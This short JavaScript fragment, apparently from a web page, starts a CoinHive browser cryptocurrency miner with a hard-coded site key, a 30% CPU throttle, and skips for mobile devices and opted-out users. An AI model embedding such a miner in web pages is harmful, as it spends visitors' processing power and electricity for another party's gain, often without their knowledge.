        var miner = new CoinHive.Anonymous('YkF8tP3zv5YOci8dEcU4JGCgVp8WnDHb', {
            throttle: 0.3
        });
        if (!miner.isMobile() && !miner.didOptOut(14400)) {
            miner.start();
        }